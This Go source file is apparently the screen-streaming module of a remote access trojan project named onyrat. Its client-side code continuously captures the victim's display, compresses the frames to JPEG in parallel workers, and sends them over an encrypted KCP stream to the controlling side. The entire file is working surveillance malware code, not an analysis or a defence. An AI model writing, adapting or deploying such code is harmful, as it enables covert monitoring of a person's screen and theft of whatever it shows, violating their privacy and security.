//go:build client
// +build client

package videostreaming

import (
	"bytes"
	"context"
	"fmt"
	"image"
	"image/jpeg"
	"io"
	"runtime"
	"sync"
	"time"

	"github.com/Onyz107/onyrat/pkg/network"
	"github.com/kbinani/screenshot"
)

func ScreenstreamSend(c *network.KCPClient, ctx context.Context) error {
	inCtx, cancel := context.WithCancelCause(ctx)
	defer cancel(nil)

	stream, err := c.Manager.OpenStream(screenStream, 20*time.Second)
	if err != nil {
		return fmt.Errorf("failed to open screen stream: %w", err)
	}
	defer stream.Close()

	w, err := c.NewStreamedEncryptedSender(stream, 5*time.Second)
	if err != nil {
		return fmt.Errorf("failed to create encrypted sender: %w", err)
	}
	defer w.Close()

	frameChan := takeScreenshots(inCtx, cancel)
	encodedChan := encodeScreenshots(inCtx, cancel, frameChan)

	for encoded := range encodedChan {
		select {

		case <-inCtx.Done():
			if err := context.Cause(inCtx); err != nil && err != context.Canceled && err != context.DeadlineExceeded {
				return fmt.Errorf("failed to send screen stream: %w", err)
			}

		default:
			w.Write(encoded.Bytes())
			bytesPool.Put(encoded)

		}

	}

	if err := context.Cause(inCtx); err != nil && err != context.Canceled && err != context.DeadlineExceeded {
		return fmt.Errorf("failed to send screen stream: %w", err)
	}

	return nil
}

func takeScreenshots(ctx context.Context, cancel context.CancelCauseFunc) <-chan image.Image {
	bounds := screenshot.GetDisplayBounds(0)
	frameChan := make(chan image.Image, 1)

	go func() {
		defer close(frameChan)

		for {
			select {

			case <-ctx.Done():
				return

			default:
				img, err := screenshot.CaptureRect(bounds)
				if err != nil {
					cancel(fmt.Errorf("failed to capture screen: %w", err))
					return
				}

				select {

				case frameChan <- img:

				default:
					// drop frame if queue is full

				}

			}
		}
	}()

	return frameChan
}

func encodeScreenshots(ctx context.Context, cancel context.CancelCauseFunc, imgs <-chan image.Image) <-chan *bytes.Buffer {
	var wg sync.WaitGroup

	workers := runtime.NumCPU()
	encodedImages := make(chan *bytes.Buffer, workers*2)

	for range workers {
		wg.Add(1)
		go func() {
			defer wg.Done()

			for img := range imgs {
				select {

				case <-ctx.Done():
					return

				default:
					b := bytesPool.Get().(*bytes.Buffer)
					b.Reset()

					if err := writeEncodedJPEG(img, b); err != nil {
						cancel(fmt.Errorf("failed to write encoded jpeg: %w", err))
						bytesPool.Put(b)
						return
					}

					select {

					case encodedImages <- b:

					default:
						// drop if writer is full
						bytesPool.Put(b)
					}

				}
			}
		}()
	}

	go func() {
		wg.Wait()
		close(encodedImages)
	}()

	return encodedImages
}

func writeEncodedJPEG(img image.Image, writer io.Writer) error {
	err := jpeg.Encode(writer, img, &jpeg.Options{Quality: 10})
	if err != nil {
		return fmt.Errorf("failed to encode image: %w", err)
	}

	return nil
}
